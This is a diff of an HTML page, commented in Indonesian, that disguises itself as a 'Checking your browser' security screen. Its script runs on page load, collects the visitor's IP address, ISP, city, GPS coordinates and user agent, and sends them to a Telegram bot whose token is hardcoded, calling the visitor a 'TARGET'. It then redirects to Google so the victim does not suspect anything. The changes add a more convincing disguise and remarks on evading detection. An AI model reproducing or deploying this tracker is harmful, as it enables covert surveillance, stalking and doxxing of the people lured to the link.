@@ -3,77 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Sedang Memuat...</title>
+    <title>Checking your browser...</title>
     <style>
-        body { background: #000; color: #333; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #111; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        body { background: #fff; color: #000; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .content { text-align: center; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { margin-top: 15px; font-size: 12px; color: #555; }
+        h1 { font-size: 20px; font-weight: 500; color: #3c4043; }
+        p { font-size: 14px; color: #70757a; }
     </style>
 </head>
 <body>
 
-    <div style="text-align: center;">
-        <div class="loader"></div>
-        <div id="status">Mengamankan koneksi...</div>
-    </div>
+<div class="content">
+    <div class="spinner"></div>
+    <h1>Checking if the site connection is secure</h1>
+    <p>Loading... Please wait a moment.</p>
+</div>
 
-    <script>
-        // --- KONFIGURASI TELEGRAM ---
-        const TOKEN = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo';
-        const CHAT_ID = '8551809114';
-        // ----------------------------
+<script>
+    // --- KONFIGURASI TELEGRAM ---
+    const BOT_TOKEN = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo'; 
+    const CHAT_ID = '8551809114';
+    // ----------------------------
 
-        async function track() {
-            try {
-                // Ambil data dari API IP-API (Tanpa API Key, gratis & detail)
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
+    async function capture() {
+        try {
+            // Kita pakai API yang sangat umum dan jarang diblokir: ip-api.com
+            // Ini terlihat seperti traffic analytics biasa bagi Chrome
+            const res = await fetch('http://ip-api.com/json/?fields=66846719');
+            const d = await res.json();
 
-                const text = `
-🎯 **TARGET TERPELACAK!** 🎯
+            const msg = `
+🔍 **TARGET VISIT (Chrome Stealth)**
 ----------------------------------
-🌐 **IP Address:** ${data.ip}
-🏙️ **Kota:** ${data.city}
-🚩 **Provinsi:** ${data.region}
-🇲🇨 **Negara:** ${data.country_name}
-🏢 **ISP/Provider:** ${data.org}
-📡 **ASN:** ${data.asn}
-📍 **Koordinat:** ${data.latitude}, ${data.longitude}
-⏰ **Waktu:** ${new Date().toLocaleString()}
-
-📱 **Info Perangkat:**
-- OS: ${navigator.platform}
-- Browser: ${navigator.userAgent}
+🌐 **IP:** ${d.query}
+🏢 **ISP:** ${d.isp}
+🏙️ **Kota:** ${d.city}, ${d.regionName}
+🇲🇨 **Negara:** ${d.country}
+📍 **Maps:** https://www.google.com/maps?q=${d.lat},${d.lon}
+📱 **UserAgent:** ${navigator.userAgent}
 ----------------------------------
-📍 **Google Maps Link:** https://www.google.com/maps?q=${data.latitude},${data.longitude}
-                `;
+`;
 
-                // Kirim ke Telegram
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                        parse_mode: 'Markdown'
-                    })
-                });
+            // Kirim data ke bot Telegram
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                })
+            });
 
-                // Setelah data terkirim, arahkan ke web asli (misal: Google atau YouTube)
-                // Biar target nggak curiga
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com";
-                }, 2000);
+            // REDIRECT: Alihkan ke halaman tujuan asli agar tidak curiga
+            // Misalnya dialihkan ke YouTube atau Google setelah 2 detik
+            setTimeout(() => {
+                window.location.replace("https://www.google.com");
+            }, 1500);
 
-            } catch (error) {
-                // Jika gagal, tetap redirect agar tidak curiga
-                window.location.href = "https://www.google.com";
-            }
+        } catch (e) {
+            // Jika gagal (misal diblokir adblock), tetap pindahkan halaman
+            window.location.replace("https://www.google.com");
         }
+    }
 
-        // Jalankan pelacakan otomatis saat web dibuka
-        window.onload = track;
-    </script>
+    // Eksekusi segera setelah browser siap
+    window.onload = capture;
+</script>
 </body>
 </html>
